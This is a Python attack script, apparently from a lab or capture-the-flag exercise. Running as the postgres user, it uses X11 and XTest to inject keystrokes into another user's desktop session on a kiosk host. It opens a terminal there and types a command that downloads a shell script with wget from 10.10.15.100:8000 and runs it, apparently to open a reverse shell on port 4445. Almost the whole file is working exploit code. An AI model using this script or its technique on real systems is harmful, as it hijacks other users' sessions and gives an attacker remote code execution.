#!/usr/bin/env python3
# x.py — run as postgres. Injects keystrokes into dutyfree-kiosk's X session (:0).
import ctypes, time, sys

# Command typed into the kiosk's terminal (runs as dutyfree-kiosk)
CMD = "wget -qO /tmp/r.sh http://10.10.15.100:8000/r.sh; bash /tmp/r.sh 10.10.15.100 4445"

X = ctypes.CDLL("libX11.so.6")
T = ctypes.CDLL("libXtst.so.6")

# --- function signatures ---
X.XOpenDisplay.restype = ctypes.c_void_p
X.XOpenDisplay.argtypes = [ctypes.c_char_p]
X.XDefaultRootWindow.restype = ctypes.c_ulong
X.XDefaultRootWindow.argtypes = [ctypes.c_void_p]
X.XStringToKeysym.restype = ctypes.c_ulong
X.XStringToKeysym.argtypes = [ctypes.c_char_p]
X.XKeysymToKeycode.restype = ctypes.c_ubyte
X.XKeysymToKeycode.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
X.XFlush.argtypes = [ctypes.c_void_p]
X.XQueryTree.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                         ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.c_ulong),
                         ctypes.POINTER(ctypes.POINTER(ctypes.c_ulong)), ctypes.POINTER(ctypes.c_uint)]
X.XFetchName.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_char_p)]
X.XSetInputFocus.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_int, ctypes.c_ulong]
X.XRaiseWindow.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
X.XFree.argtypes = [ctypes.c_void_p]
T.XTestFakeKeyEvent.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_int, ctypes.c_ulong]

# --- connect to the kiosk display ---
# If Xauthority is elsewhere, set XAUTHORITY before running:
#   export XAUTHORITY=/home/dutyfree-kiosk/.Xauthority
d = X.XOpenDisplay(b":0")
if not d:
    sys.exit("cannot open display :0 (check XAUTHORITY / -ac)")

root = X.XDefaultRootWindow(d)

def kc(name):
    return X.XKeysymToKeycode(d, X.XStringToKeysym(name.encode()))

def fake(code, down):
    T.XTestFakeKeyEvent(d, code, 1 if down else 0, 0)

def combo(keys):
    cs = [kc(k) for k in keys]
    for c in cs: fake(c, 1)
    for c in reversed(cs): fake(c, 0)
    X.XFlush(d); time.sleep(0.25)

# Characters that need a keysym name or Shift
SPECIAL = {" ": "space", "/": "slash", "-": "minus", ".": "period", ",": "comma",
           ";": "semicolon", ":": "colon", ">": "greater", "<": "less", "&": "ampersand",
           "|": "bar", "_": "underscore", "+": "plus", "=": "equal", "(": "parenleft",
           ")": "parenright", "'": "apostrophe", '"': "quotedbl", "~": "asciitilde",
           "!": "exclam", "?": "question", "$": "dollar", "#": "numbersign", "*": "asterisk",
           "@": "at", "%": "percent", "^": "asciicircum", "{": "braceleft", "}": "braceright",
           "\\": "backslash", "`": "grave"}
SHIFTED = set("~!@#$%^&*()_+{}|:\"<>?")

def press(ch):
    if ch == "\n":
        combo(["Return"]); return
    name = SPECIAL.get(ch, ch.lower() if ch.isalpha() else ch)
    shift = ch.isupper() or ch in SHIFTED
    code = kc(name)
    if not code: return
    sh = kc("Shift_L")
    if shift: fake(sh, 1)
    fake(code, 1); fake(code, 0)
    if shift: fake(sh, 0)
    X.XFlush(d); time.sleep(0.03)

def wins(win=None):
    if win is None: win = root
    out = []
    rr = ctypes.c_ulong(); pr = ctypes.c_ulong()
    ch = ctypes.POINTER(ctypes.c_ulong)(); n = ctypes.c_uint()
    if not X.XQueryTree(d, win, ctypes.byref(rr), ctypes.byref(pr),
                        ctypes.byref(ch), ctypes.byref(n)):
        return out
    for i in range(n.value):
        w = ch[i]; nm = ctypes.c_char_p()
        if X.XFetchName(d, w, ctypes.byref(nm)) and nm.value:
            out.append((w, nm.value.decode(errors="replace")))
        out.extend(wins(w))
    if ch: X.XFree(ch)
    return out

# --- 1. snapshot windows, then open a terminal as kiosk ---
before = set(w for w, _ in wins())
combo(["Control_L", "Alt_L", "t"])     # kiosk WM opens xterm/gnome-terminal

# --- 2. find the new terminal ---
cand = []
for _ in range(10):
    cand = [(w, n) for w, n in wins()
            if w not in before and ("xterm" in n.lower() or "dutyfree-kiosk" in n.lower())]
    if cand: break
    time.sleep(0.25)
if not cand:
    cand = [(w, n) for w, n in wins() if "xterm" in n.lower()]
if not cand:
    sys.exit("no terminal appeared")

w, name = max(cand)
X.XRaiseWindow(d, w)
X.XSetInputFocus(d, w, 2, 0)   # RevertToParent
X.XFlush(d); time.sleep(0.4)

# --- 3. type the payload as dutyfree-kiosk ---
for ch in CMD:
    press(ch)
combo(["Return"])
print(f"[+] typed into window {w} ({name})")
